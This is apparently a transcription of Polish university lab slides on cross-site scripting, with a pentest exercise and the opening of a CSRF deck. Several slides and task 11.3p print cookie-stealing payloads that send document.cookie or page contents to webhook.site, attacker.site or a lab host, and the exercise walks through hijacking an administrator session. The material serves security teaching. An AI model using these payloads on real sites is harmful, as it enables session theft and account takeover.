  wyświetlane przez pracowników w aplikacji wewnętrznej danej organizacji.


                                                                                                                                                                            2121
s32924 2026-06-21 18:57:09
```

### Strona 22 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS

  Blind XSS jest znacznie trudniejszy w wykrywaniu ze względu na ograniczoną
  widoczność. Pomocne w poszukiwaniu tego typu podatności są takie strony jak
  https://webhook.site .


                                                                                                                                                                            2222
s32924 2026-06-21 18:57:09
```

### Strona 23 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS

  Webhook.site informuje użytkownika, gdy zostanie wykonane dowolne zapytanie
  pod wygenerowany unikatowy adres URL.


                                                                                                                                                                            2323
s32924 2026-06-21 18:57:09
```

### Strona 24 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS

  Przykładowy wpis o wykonanym zapytaniu.


                                                                                                                                                                            2424
s32924 2026-06-21 18:57:09
```

### Strona 25 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS - przykładowy scenariusz

 W formularzu z opinią dla administratora, atakujący przesyła kod, który wykona
  zapytanie pod nasz unikatowy adres webhook.


                                                                                                                                                                            2525
s32924 2026-06-21 18:57:09
```

### Strona 26 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Blind XSS - przykładowy scenariusz

  Administrator   odwiedza   wewnętrzny
  portal    do    wyświetlania     opinii              internal.vulnerable.com
  użytkowników. Wstrzyknięty kod zostaje
  wykonany przez jego przeglądarkę.

                                                         Cool website

                                                      Test123

                                                    whatsup

                                                          Great application!


                                                                                                                                                                            2626
s32924 2026-06-21 18:57:09
```

### Strona 27 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XSS przez upload plików

  Jeśli aplikacja posiada funkcję uploadu’u plików, otwiera to okno na kolejne
  potencjalne możliwości wykonania XSS.


                                                                                                                                                                            2727
s32924 2026-06-21 18:57:09
```

### Strona 28 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XSS przez upload plików

  Jednym z ciekawszych przykładów jest upload zdjęcia w formacie SVG. SVG
  stanowi format graficzny bazujący na tagach XML. Oznacza to, że możemy
  zamieścić kod bezpośrednio w treści obrazu:


  <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert(document.domain)</script>
  </svg>


                                                                                                                                                                            2828
s32924 2026-06-21 18:57:09
```

### Strona 29 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XSS przez upload plików

  Oczywiście jest to tylko jeden z przykładów. Inną metodą jest zamieszczanie kodu
 w treści komentarza obrazu w formacie JPG lub PNG, np. przy użyciu narzędzia
  exfitool:


  exiftool -Comment="<script>alert()<script>" xss.png


  Tego typu podatność jest uważana za rzadkość w dzisiejszych czasach, jednak wciąż istnieją
  przykłady udanej eksploitacji w świecie rzeczywistym: https://hackerone.com/reports/964550


                                                                                                                                                                            2929
s32924 2026-06-21 18:57:09
```

### Strona 30 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 DOM XSS

 DOM XSS jest rodzajem XSS’a który jest wykonywany całkowicie po stronie klienta
  aplikacji  (najczęściej za pośrednictwem kodu  JavaScript). Złośliwy kod  jest
  wstrzykiwany w DOM (Document Object Model) strony, bez kontaktu z serwerem.


  Jest to bardziej zaawansowana metoda Cross-Site Scripting, która często wymaga
  analizowania ścieżek wejścia użytkownika w źródłach kodu JavaScript.


                                                                                                                                                                            3030
s32924 2026-06-21 18:57:09
```

### Strona 31 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Self-XSS

  Rodzaj  podatności  XSS, w  której  ofiara  atakuje „samą  siebie”,  np.  przez
  skopiowanie i wklejenie payload’u. W praktyce taki atak jest mało prawdopodobny,
  gdyż atakujący musi dotrzeć do docelowej ofiary  i nakłonić ją do wykonania
  złośliwego kodu.


                                                                                                                                                                            3131
s32924 2026-06-21 18:57:09
```

### Strona 32 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Podstawowa metodologia


                                                                                          Aplikacja
                                              Przeglądarka wyświetla <u>test       prawdopodobnie
                                                                                 bezpieczna   Wejście użytkownika        <u>test



                                                                                                                                                                            3232
s32924 2026-06-21 18:57:09
```

### Strona 33 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Podstawowa metodologia


   Widzimy popup alert()       Podatność XSS

   Brak popup’a alert()        Szukamy w źródle czego brakuje                                                                    Podatność XSS                                   (został wycięty tag? Jakiś
                              symbol?)                                                            Może to być jedynie
                                                                    podatność HTML injection


                                                                                                                                                                            3333
s32924 2026-06-21 18:57:09
```

### Strona 34 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Podstawowa metodologia

  Podczas testów funkcja „alert()” stanowi książkowy przykład pokazania istnienia
  podatności z prostego powodu - jest to bardzo prosta metoda do udowodnienia
  wykonania kodu JavaScript. Warto jednak wziąć pod uwagę, że kod może zostać
  wykonany w kontekście innej strony, np. kiedy część zawartości na stronie jest
  osadzona w tagu <iframe>. Ważne jest sprawdzenie w jakim kontekście wykonana
  nasza podatność XSS przed jej zgłoszeniem, gdyż może ona dotyczyć zupełnie
  innego podmiotu. W tym celu często stosuje się payloady:

  img src=x onerror=alert(window.origin)>
  img src=x onerror=alert(document.domain)>

  które pokazują w jakim kontekście wykonywany jest nasz skrypt.


                                                                                                                                                                            3434
s32924 2026-06-21 18:57:09
```

### Strona 35 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Eksploitacja

  Dotychczas pokazane zostały metody poszukiwania podatności XSS. Warto jednak
  zobaczyć jak podatność umożliwia kradzież danych, aby zrozumieć jej istotność.


                                                                                                                                                                            3535
s32924 2026-06-21 18:57:09
```

### Strona 36 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Eksploitacja

  Poniższy skrypt wysyła zapytanie pod adres webhook.site wraz z plikami cookies
  ofiary w parametrze „cookie”.


   <script>
   new Image().src='https://webhook.site/90799f2d-65fc-
   4843-9bf2-687b9369dc71?cookie='+document.cookie;
   </script>


                                                                                                                                                                            3636
s32924 2026-06-21 18:57:09
```

### Strona 37 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Eksploitacja

  Inne metody kradzieży plików cookies:


  <script>
  new Image().src='http://attacker.site:8888/?cookie='+document.cookie;
  </script>





  <style/onload=navigator.sendBeacon('http://attacker.site/steal'
  ,document.body.innerHTML)


                                                                                                                                                                            3737
s32924 2026-06-21 18:57:09
```

### Strona 38 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Kontekst ataku

  Każdy scenariusz podatności XSS jest inny; dla konkretnej aplikacji jedna
  część metod może okazać się skuteczna, podczas gdy pozostała już nie.
  Dzieje  się  tak  ze  względu  na  to  jak  aplikacja  przetwarza  wejście
  użytkownika, gdzie  je umieszcza, czy posiada  filtry, włączone pewne
  funkcje, CSP, itp.


  Np. podatne wejście może być już osadzone w tagu <script>…<script> ,
  wtedy nasz payload zadziała bez nich.


                                                                                                                                                                            3838
s32924 2026-06-21 18:57:09
```

### Strona 39 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Kontekst ataku

  Czasami może być konieczne domknięcie tagów HTML, w których następuje
  wstrzyknięcie.


 <div option="asd" select="{INPUT}">


                                                                                                                                                                            3939
s32924 2026-06-21 18:57:09
```

### Strona 40 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Kontekst ataku

  Czasami może być konieczne domknięcie tagów HTML, w których następuje
  wstrzyknięcie.


   <div option="asd" select="{INPUT}">

   Zwykły payload <script>alert()</script> nie zadziała:

   <div option="asd" select="<script>alert()</script>">


                                                                                                                                                                            4040
s32924 2026-06-21 18:57:09
```

### Strona 41 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Kontekst ataku

  Czasami może być konieczne domknięcie tagów HTML, w których następuje
  wstrzyknięcie.


   <div option="asd" select="{INPUT}">

   Należy zmieć payload tak, aby zamykał tag HTML do którego
   próbujemy wstrzyknąć kod – "><script>alert()</script>:

   <div option="asd" select=""><script>alert()</script>">


                                                                                                                                                                            4141
s32924 2026-06-21 18:57:09
```

### Strona 42 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Kodowanie znaków

  Aplikacja może filtrować wybrane znaki lub blokować nasze wejście
  przez blacklistę. Można wtedy spróbować użyć kodowania znaków


   &lt;script&gt;alert()&lt;/script&gt;






                                                                                                                                                                            4242
s32924 2026-06-21 18:57:09
```

### Strona 43 / 60

#### Tekst

```text
                   XSS                                                                                                                                                                      PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:09
```

### Strona 44 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyna WEB - XSS jest włączona.
  Jeżeli  coś  się  zepsuje, w  każdej  chwili możesz  ją  przywrócić do  stanu
  początkowego.


                                                                                                                                                                            44
s32924 2026-06-21 18:57:09
```

### Strona 45 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

  sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga!  Wszystkie  zadania  z  tego  dokumentu  wykonujemy  na  maszynie
  ĆWICZENIA.


                                                                                                                                                                            45
s32924 2026-06-21 18:57:09
```

### Strona 46 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                            46
s32924 2026-06-21 18:57:09
```

### Strona 47 / 60

#### Tekst

```text
                   XSS                                                                          KATEDRA                                                                                     PJA.EDU.PL


          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:09
```

### Strona 48 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.1: Stored XSS - HTML
  Wejdź na stronę: http://192.168.100.11/
  Na  stronie  dostępny  jest  formularz  do  zostawiania  wiadomości,  które
  zapisywane są na serwerze i wyświetlane wszystkim użytkownikom.
  Celem zadania jest wstrzyknięcie dowolnego pokreślonego tekstu HTML
  (<u>) w wiadomości!
  Przykład:

  <u>PJATK</u>


                                                                                                                                                                            48
s32924 2026-06-21 18:57:09
```

### Strona 49 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.1: Stored XSS - HTML
  Po wstrzyknięciu tagu HTML <u>, zadanie zostanie zaliczone automatycznie:


                                                                                                                                                                             Stored XSS -
                                                                                                                                         HTML


                                                                                                                                                                            49
s32924 2026-06-21 18:57:09
```

### Strona 50 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.2: Stored XSS - JavaScript
  Wejdź na stronę: http://192.168.100.11/
  Celem zadania jest wstrzyknięcie kodu Javascript (tag <script>...</script>)
  wyświetlającego alert!


  Przykład:
  <script>alert('XSS')</script>


                                                                                                                                                                            50
s32924 2026-06-21 18:57:09
```

### Strona 51 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.2: Stored XSS - JavaScript


  Po wyświetleniu alertu, zadanie zostanie zaliczone automatycznie:


                                                                                                                                                            Stored XSS -
                                                                                                                                                                       JavaScript


                                                                                                                                                                            51
s32924 2026-06-21 18:57:09
```

### Strona 52 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.3: Stored XSS - document.cookie

  Wejdź na stronę: http://192.168.100.11/
  Celem zadania jest wstrzyknięcie kodu Javascript (tag <script>...</script>)
  wyświetlającego ciasteczka za pomocą funkcji alert!
  Przykład:
  <script>alert(document.cookie)</script>


                                                                                                                                                                            52
s32924 2026-06-21 18:57:09
```

### Strona 53 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.3: Stored XSS - document.cookie

  Po wyświetleniu alertu z ciasteczkiem, zadanie zostanie zaliczone
  automatycznie:


                                                                                                                                                                                     Stored XSS -
                                                                                                                                                                            document.cookie


                                                                                                                                                                            53
s32924 2026-06-21 18:57:09
```

### Strona 54 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.4: Reflected XSS

  Wejdź na stronę: http://192.168.100.11/reflected/
 Tym razem dane użytkownika przesłane w zapytaniu nie są zapisywane
  na serwerze, tylko jednorazowo „odbijane” w odpowiedzi (źródle strony).
  Celem zadania jest wstrzyknięcie kodu Javascript (tag <script>...</script>)
  wyświetlającego ciasteczka za pomocą funkcji alert!
  Przykład:
  <script>alert(document.cookie)</script>
  Zauważ, że w przeciwieństwie do Stored XSS, payload jest widoczny tylko wtedy,
  gdy zostanie przesłany w zapytaniu!
  URL:
  Źródło HTML:
                                                                                                                                                                            54
s32924 2026-06-21 18:57:09
```

### Strona 55 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.4: Reflected XSS - document.cookie

  Po wyświetleniu alertu z ciasteczkiem, zadanie zostanie zaliczone
  automatycznie:


                                                                                                                                                                                          Reflected XSS


                                                                                                                                                                            55
s32924 2026-06-21 18:57:09
```

### Strona 56 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.5: DOM-based XSS
  Wejdź na stronę: http://192.168.100.11/dom/
 Tym razem dane od użytkownika NIE SĄ wyświetlane bezpośrednio w źródle
  strony, tylko generowane dynamicznie za pomocą właściwości innerHTML.
  Celem zadanie jest wstrzyknięcie kodu Javascript (event onerror w tagu
  )   wyświetląjącego   ciasteczka   za   pomocą    funkcji    alert!
  Uwaga:  Właściwość  innerHTML  blokuje  wykonanie  kodu w  tagach
  <script>…</script>!
  Przykład (nieistniejący obrazek powodujący wykonanie kodu):




                                                                                                                                                                            56
s32924 2026-06-21 18:57:09
```

### Strona 57 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.5: DOM-based XSS

  Zauważ,  że  payload  NIE MUSI  zostać  wyświetlony w  odpowiedzi HTTP
  (źródle strony), aby atak zadziałał!
  URL:


  Źródło HTML (ctrl-f):


                                                                                                                                                                            57
s32924 2026-06-21 18:57:09
```

### Strona 58 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.5: DOM-based XSS

  Po wyświetleniu alertu z ciasteczkiem, zadanie zostanie zaliczone
  automatycznie:


                                                                                                                                                   DOM-based XSS


                                                                                                                                                                            58
s32924 2026-06-21 18:57:09
```

### Strona 59 / 60

#### Tekst

```text
                    XSS                                                                                   POLSKO-JAPOŃSKAPOLSKO-JAPOŃSKA AKADEMIAAKADEMIA TECHNIKTECHNIK KOMPUTEROWYCHKOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 XSS „cheat sheet”

  https://www.esecurityplanet.com/networks/cross-site-scripting-xss/
  Rodzaje XSS


                                                                                                                                                                            5959
s32924 2026-06-21 18:57:09
```

### Strona 60 / 60

#### Tekst

```text
                   XSS                                                                                                                                                                      PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:09
```

---

## 6. 11p. Błędy Cross-site Scripting PENTEST (1)(2).pdf

Liczba stron: 16


### Strona 1 / 16

#### Tekst

```text
                   XSS | PENTEST                                                                                                                                                            PJA.EDU.PL
       Podatności
   Cross-site Scripting
        Pentest
                        KOMPUTEROWYCH                         Zajęcia nr 11
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 18:57:10
```

### Strona 2 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ŚRODOWISKOUruchamianiePołączenieZADANIA11.1p11.2p11.3p11.4p LogiXSSKradzieżFlaga……..…………………………….….adminaOpenVPNadminamaszynciastka……………...…….…….………………..……….……………………….……….…….……..……………………..
                                ŚRODOWISKO
                                                                 Uruchamianie maszyn ……………………..  4
                                                                     Połączenie OpenVPN ………………………. 5
                                   ZADANIA
                                                                11.1p Logi admina ……………...…….…….  8
                                                                11.2p XSS ……..…………………………….…. 10
                                                                11.3p Kradzież ciastka ……….…….……..  12
                                                                11.4p Flaga admina ………………..………. 14


                                                                                                                                                                                                            2
s32924 2026-06-21 18:57:10
```

### Strona 3 / 16

#### Tekst

```text
                   XSS | PENTEST                                                                                                                                                            PJA.EDU.PL


       Przygotowanie
         środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:10
```

### Strona 4 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyny WEB - XSS oraz WEB - XSS PENTEST
  są włączone.
  Jeżeli  coś  się  zepsuje, w  każdej  chwili możesz  je  przywrócić do  stanu
  początkowego.


                                                                                                                                                                                                            4
s32924 2026-06-21 18:57:10
```

### Strona 5 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN


  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

  sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga! Wszystkie zadania z tego dokumentu wykonujemy na maszynie PENTEST.


                                                                                                                                                                                                            5
s32924 2026-06-21 18:57:10
```

### Strona 6 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                                                            6
s32924 2026-06-21 18:57:10
```

### Strona 7 / 16

#### Tekst

```text
                   XSS | PENTEST                                                                                                                                                            PJA.EDU.PL


          Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:10
```

### Strona 8 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.1p: Logi admina

  Na    stronie   http://192.168.100.61/   znajduje    się   panel   logowania,
  do   którego    nie   znamy       i    nie   poznamy   prawidłowego    hasła.
  Możliwe  natomiast  będzie  zdobycie   identyfikatora   sesji   administratora
     i zalogowanie się bez hasła!
  Pierwszym celem zadania jest uruchomienie dowolnego narzędzia do enumeracji
     i wyenumerowanie dostępnych katalogów na stronie: http://192.168.100.61/


   Przykład:

    gobuster dir -u http://192.168.100.61/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt


                                                                                                                                                                                                            8
s32924 2026-06-21 18:57:10
```

### Strona 9 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.1p: Logi admina
  Zadanie zostanie zaliczone automatycznie po wejściu do katalogu z logami:


                                                                                                                                                                                                              Logi admina


                                                                                                                                                                                                            9
s32924 2026-06-21 18:57:10
```

### Strona 10 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.2p: XSS

  Celem zadania jest znalezienie podatności XSS w nazwie użytkownika
  wyświetlanej w logach i wstrzyknięciu tam dowolnego tagu HTML.

  Przykład:

  Username: <u>XSS
  Password: abc


                                                                                                                                                                                                           10
s32924 2026-06-21 18:57:10
```

### Strona 11 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.2p: XSS

  Zadanie zostanie automatycznie rozwiązane po wyświetleniu logów
  z wstrzykniętym dowolnym HTML:


                                                                                                                             XSS


                                                                                                                                                                                                           11
s32924 2026-06-21 18:57:10
```

### Strona 12 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.3p: Kradzież ciastka
  Celem   zadania    jest   poznanie   identyfikatora    sesji   Administratora,
  który przechowywany jest w ciastku o nazwie PHPSESSID:

  1) Uruchom serwer http na Kali (python3 -m http.server 80).
  2) Wstrzyknij  jako  nazwę  użytkownika  kod  Javascript,  który  wykona
     przekierowanie do Kali i doklei ciastka aktualnie zalogowanego użytkownika
     (każdego, który wyświetli logi z dopisanym skryptem XSS) do URL.
  Przykład:
  Username: <script>location.href="http://10.65.0.6/"+escape(document.cookie)</script>
  Password: abc
  Do maksymalnie jednej minuty, na Twój serwer powinna zostać przekierowana
  przeglądarka Administratora i jego ciastko z ID sesji doklejone w URL.


                                                                                                                                                                                                           12
s32924 2026-06-21 18:57:10
```

### Strona 13 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.3p: Kradzież ciastka

  Zadanie zostanie zaliczone automatycznie po otrzymaniu ciastka Administratora
  (IP 192.168.100.61):


                                                                                                                  Kradzież ciastka


                                                                                                                                                                                                           13
s32924 2026-06-21 18:57:10
```

### Strona 14 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.4p: Flaga admina
  Identyfikaor  sesji  Administratora można  wykorzystać, aby zalogować  się
  na stronę bez znajomości hasła!
  Celem zadania  jest podmiana  identyfikatora  sesji w ciastku (PHPSESSID)
  na ten wykradziony za pomocą ataku XSS.
 Po odświeżeniu strony odczytaj flagę i wklej ją w formularzu.
  Przypomnienie:
  Dostęp do edycji cookies na Firefox: F12 -> Storage -> Cookie
  Dostęp do edycji cookies na Chrome: F12 -> Application -> Cookies


                                                                                                                                                                                                           14
s32924 2026-06-21 18:57:10
```

### Strona 15 / 16

#### Tekst

```text
                    XSS | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 11.4p: Flaga admina

  Zadanie należy zaliczyć manualnie - po podmianie ciasteczka i odświeżeniu
  strony, należy skopiować wyświetlona flagę i wkleić w formularzu na platformie.


                                                                                                                                               Flaga admina


                                                                                                                                                                                                           15
s32924 2026-06-21 18:57:10
```

### Strona 16 / 16

#### Tekst

```text
                   XSS | PENTEST                                                                                                                                                            PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 18:57:10
```

---

---

# Notatki z PDF - część 2/2

Wersja poprawiona: zdjęcia/obrazy stron zostały usunięte. Zostaje sama transkrypcja tekstu z PDF, żeby plik był lekki.

## Spis plików w tej części

7. [12. Cross-site Request Forgery (1)(2).pdf](#12-cross-site-request-forgery-1-2-pdf) - 37 stron
8. [12p. Cross-site Request Forgery PENTEST (1)(2).pdf](#12p-cross-site-request-forgery-pentest-1-2-pdf) - 17 stron
9. [13. XXE (4)(1).pdf](#13-xxe-4-1-pdf) - 36 stron
10. [13p. XXE PENTEST (4)(1).pdf](#13p-xxe-pentest-4-1-pdf) - 17 stron
11. [14. File upload (2)(2).pdf](#14-file-upload-2-2-pdf) - 28 stron
12. [14p. File upload PENTEST (2)(2).pdf](#14p-file-upload-pentest-2-2-pdf) - 14 stron

---

## 7. 12. Cross-site Request Forgery (1)(2).pdf

Liczba stron: 37


### Strona 1 / 37

#### Tekst

```text
                   CSRF                                                                                                                                                                     PJA.EDU.PL
        Cross-site
    Request Forgery

                        KOMPUTEROWYCH                         Zajęcia nr 12
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 14:49:24
```

### Strona 2 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wstęp

  Student nauczy się odnajdywać podatności typu CSRF i wykorzystywać je.


                                                                                                                                                                              2
s32924 2026-06-21 14:49:24
```

### Strona 3 / 37

#### Tekst

```text
                    WYKRYWANIE TYLNYCH FURTEK                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….……… 5
                                                         Połączenie OpenVPN …………………………………… 6

                                 TEORIA
                                             Czym jest CSRF? ………..……………………………….. 9
                                                 Metody obrony przed CSRF ………………..………… 10

                                ZADANIA
                                                     12.1 GET CSRF …………………………………….……… 21
                                                     12.2 POST CSRF ……………….……………..……..…… 25
                                                     12.3 CSRF TOKEN …………………………..……….….. 30


                                                                                                                                                                              3
s32924 2026-06-21 14:49:24
```

